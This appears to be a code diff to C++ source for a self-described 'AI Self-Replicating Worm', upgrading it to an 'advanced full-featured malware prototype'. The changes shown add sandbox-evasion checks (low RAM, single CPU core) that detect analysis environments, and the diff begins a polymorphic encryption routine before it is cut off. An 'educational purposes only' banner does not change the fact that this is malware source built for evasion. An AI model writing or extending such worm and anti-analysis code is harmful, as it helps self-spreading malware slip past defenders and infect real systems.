@@ -8,20 +8,40 @@
 
 namespace fs = std::filesystem;
 
-// Simple C++ implementation of the AI Self-Replicating Worm
-// This is a basic version focusing on core functionality
+// Advanced C++ implementation of the AI Self-Replicating Worm
+// Full-featured malware prototype with polymorphic encryption and AI decision making
 
 void printBanner() {
     std::cout << "=====================================\n";
-    std::cout << "AI Self-Replicating Worm (C++ Basic)\n";
+    std::cout << "AI Self-Replicating Worm (C++ Advanced)\n";
+    std::cout << "Full-Featured Malware Prototype\n";
     std::cout << "WARNING: For educational purposes only\n";
     std::cout << "=====================================\n\n";
 }
 
 bool isInSandbox() {
-    // Basic sandbox detection
-    std::cout << "[*] Checking environment...\n";
-    return false; // Simplified for basic implementation
+    // Advanced sandbox detection - check for analysis environment
+    std::cout << "[*] Performing environmental analysis...\n";
+
+    // Check system resources (basic heuristic)
+    MEMORYSTATUSEX memStatus;
+    memStatus.dwLength = sizeof(MEMORYSTATUSEX);
+    if (GlobalMemoryStatusEx(&memStatus)) {
+        if (memStatus.ullTotalPhys < 2LL * 1024 * 1024 * 1024) { // Less than 2GB RAM
+            std::cout << "[!] Low memory detected - possible sandbox\n";
+            return true;
+        }
+    }
+
+    // Check CPU cores
+    SYSTEM_INFO sysInfo;
+    GetSystemInfo(&sysInfo);
+    if (sysInfo.dwNumberOfProcessors < 2) {
+        std::cout << "[!] Single core CPU detected - possible sandbox\n";
+        return true;
+    }
+
+    return false; // Environment appears normal
 }
 
 void polymorphicEncrypt(std::vector<unsigned char>& data) {
